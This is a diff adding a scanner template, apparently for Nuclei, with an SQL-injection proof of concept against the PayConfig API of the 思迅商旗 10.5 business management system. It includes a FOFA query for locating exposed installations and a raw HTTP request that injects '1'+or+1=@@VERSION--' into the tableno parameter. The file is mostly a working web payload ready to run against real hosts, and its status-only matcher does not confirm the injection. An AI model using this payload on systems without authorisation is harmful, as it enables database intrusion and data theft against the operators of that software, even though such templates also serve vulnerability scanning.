@@ -1,0 +1,31 @@
+id: poc-qlyblfgo04xer23z
+info:
+  name: 思迅商旗10.5商业管理系统 PayConfig 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qlyblfgo04xer23z'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qlyblfgo04xer23z
+    fofa: body="OnlineLogin.aspx"
+http:
+- raw:
+  - 'GET /api/Dinner/PayConfig?branchno&tableno=1''+or+1=@@VERSION--&uuid HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate,br
+
+    Connection: keep-alive
+
+    User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+
+    X-Requested-With: XMLHttpRequest'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
